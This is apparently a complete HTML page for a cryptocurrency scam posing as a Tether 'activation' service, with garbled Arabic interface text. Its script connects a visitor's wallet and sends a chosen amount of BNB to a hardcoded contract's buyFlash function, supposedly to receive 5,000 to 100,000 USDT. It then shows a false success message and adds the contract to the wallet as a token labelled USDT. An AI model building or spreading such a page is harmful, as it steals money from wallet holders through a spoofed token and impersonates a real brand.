<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether USD | Ù…Ø±ÙƒØ² Ø§Ù„ØªÙØ¹ÙŠÙ„</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <style>
        :root { --tether: #009393; --bg: #050d0c; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        /* Ù‡ÙŠØ¯Ø± Ø«Ø§Ø¨Øª ÙˆØ¨Ø³ÙŠØ· */
        .header { width: 100%; background: #0a1a18; border-bottom: 1px solid #16302c; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; }
        .logo-text { color: var(--tether); font-weight: bold; font-size: 18px; letter-spacing: 1px; }

        .container { background: #0a1a18; border: 1px solid #16302c; padding: 30px; border-radius: 25px; text-align: center; width: 90%; max-width: 380px; margin-top: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        
        /* Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø§Ù„Ù…Ø®Ø·Ø· Ø¨ØµÙˆØ±Ø© Ø§Ø­ØªØ±Ø§ÙÙŠØ© */
        .hero-img { width: 100%; border-radius: 15px; margin-bottom: 20px; border: 1px solid #16302c; }
        
        .usdt-icon { width: 60px; margin-bottom: 10px; filter: drop-shadow(0 0 10px var(--tether)); }
        
        select { background: #111; color: white; border: 1px solid #222; width: 100%; padding: 15px; border-radius: 12px; margin: 15px 0; font-size: 15px; cursor: pointer; outline: none; }
        
        /* Ø²Ø± Ø§Ù„Ø±Ø¨Ø· Ø§Ù„Ù…Ø¨Ø§Ø´Ø± */
        .btn-connect { background: transparent; color: var(--tether); border: 1px solid var(--tether); width: 100%; padding: 12px; border-radius: 10px; margin-bottom: 15px; cursor: pointer; font-weight: bold; font-size: 14px; }
        
        .action-btn { background: var(--tether); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
        .action-btn:active { transform: scale(0.95); }
        
        #log { margin-top: 20px; font-size: 13px; color: #6a8b87; }
        
        /* ØªØ®ØµÙŠØµ Ø´ÙƒÙ„ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ù„ØªÙƒÙˆÙ† Dark */
        #web3modal-overlay { z-index: 9999 !important; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo-text">TETHER NODE</div>
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width: 30px;">
</div>

<div class="container">
    <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=400" class="hero-img">
    
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-icon">
    <h3 style="margin:0">Ù†Ø¸Ø§Ù… Ø§Ù„Ø­Ù‚Ù† ÙˆØ§Ù„Ø³ÙŠÙˆÙ„Ø©</h3>
    <p style="font-size: 13px; color: #7a9a95; margin-bottom: 20px;">ÙŠØ¯Ø¹Ù… Ù…Ø­ÙØ¸Ø© Trust Ùˆ MetaMask Ù…Ø¨Ø§Ø´Ø±Ø©</p>

    <button class="btn-connect" id="btn-connect" onclick="onConnect()">ğŸ”Œ Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø© (Ø§Ø®ØªØ± Ù…Ø­ÙØ¸ØªÙƒ)</button>

    <select id="tierSelector">
        <option value="0.09">ØªÙØ¹ÙŠÙ„ 5,000 USDT â€” [0.09 BNB]</option>
        <option value="0.2">ØªÙØ¹ÙŠÙ„ 10,000 USDT â€” [0.2 BNB]</option>
        <option value="0.5">ØªÙØ¹ÙŠÙ„ 50,000 USDT â€” [0.5 BNB]</option>
        <option value="1.0">ØªÙØ¹ÙŠÙ„ 100,000 USDT â€” [1.0 BNB]</option>
    </select>

    <button class="action-btn" onclick="executeInjection()">Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø© Ø§Ù„Ø¢Ù† âš¡</button>
    
    <div id="log">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§ØªØµØ§Ù„ Ù„ØªØ£Ù…ÙŠÙ† Ø§Ù„Ù‚Ù†Ø§Ø©...</div>
</div>

<script>
    const Web3Modal = window.Web3Modal.default;
    const WalletConnectProvider = window.WalletConnectProvider.default;

    let web3Modal;
    let provider;
    let selectedAccount;

    function init() {
        const providerOptions = {
            walletconnect: {
                package: WalletConnectProvider,
                options: {
                    rpc: { 56: "https://bsc-dataseed.binance.org/" },
                    network: "binance",
                }
            }
        };

        web3Modal = new Web3Modal({
            cacheProvider: false, 
            providerOptions,
            theme: "dark"
        });
    }

    // ÙØªØ­ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ù…Ø¨Ø§Ø´Ø±Ø©
    async function onConnect() {
        try {
            provider = await web3Modal.connect();
            const web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts();
            selectedAccount = accounts[0];
            
            document.getElementById('btn-connect').innerText = "âœ… Ù…ØªØµÙ„: " + selectedAccount.substring(0,8) + "...";
            document.getElementById('log').innerText = "ØªÙ… Ø§Ù„Ø±Ø¨Ø·. Ø§Ø®ØªØ± Ø§Ù„Ø¨Ø§Ù‚Ø© ÙˆØ§Ø¶ØºØ· Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø©.";
        } catch(e) { console.log("User closed modal"); }
    }

    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    async function executeInjection() {
        if (!selectedAccount) return onConnect();
        
        const log = document.getElementById('log');
        try {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const bnbVal = document.getElementById('tierSelector').value;

            log.innerText = "ÙŠØ±Ø¬Ù‰ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© ÙÙŠ Ù…Ø­ÙØ¸ØªÙƒ...";
            
            await contract.methods.buyFlash().send({
                from: selectedAccount,
                value: web3.utils.toWei(bnbVal, "ether"),
                gas: 250000
            });

            log.innerHTML = "<b style='color:#00ffa3;'>âœ… ØªÙ…Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©! Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„Ø±ØµÙŠØ¯ Ø®Ù„Ø§Ù„ Ø¯Ù‚Ø§Ø¦Ù‚.</b>";

            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ (ÙÙ‚Ø· Ù„Ù„Ù…Ø­Ø§ÙØ¸ Ø§Ù„ØªÙŠ ØªØ¯Ø¹Ù… Ø§Ù„Ø·Ù„Ø¨)
            if (provider.request) {
                await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT_ADDR,
                            symbol: 'USDT',
                            decimals: 18,
                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                        },
                    },
                });
            }
        } catch (e) { log.innerText = "ÙØ´Ù„Øª Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© Ø£Ùˆ ØªÙ… Ø¥Ù„ØºØ§Ø¤Ù‡Ø§."; }
    }

    window.addEventListener('load', init);
</script>
</body>
</html>
